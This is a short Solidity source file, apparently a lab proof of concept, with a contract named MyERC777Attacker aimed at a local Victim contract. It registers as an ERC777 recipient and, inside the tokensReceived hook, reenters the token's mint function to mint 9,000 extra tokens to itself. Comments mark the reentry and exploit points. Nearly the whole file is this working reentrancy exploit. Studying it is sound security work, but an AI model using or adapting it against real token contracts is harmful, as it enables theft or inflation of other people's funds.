// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

contract MyERC777Attacker {
    bytes32 private constant _TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    IERC1820Registry registry = IERC1820Registry(address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24));

    MyERC777 erc777;

    constructor(address _erc777Address) {
        erc777 = MyERC777(_erc777Address);
        registry.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function Attack() public {
        erc777.mint(address(this), 1000, "", "");
        erc777.transfer(address(this), 100);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external {
        // reenter here
        if (from != address(0)) {
            erc777.mint(address(this), 9000, "", ""); // exploit here, mint tokens 9,000 to self
        }
    }
}
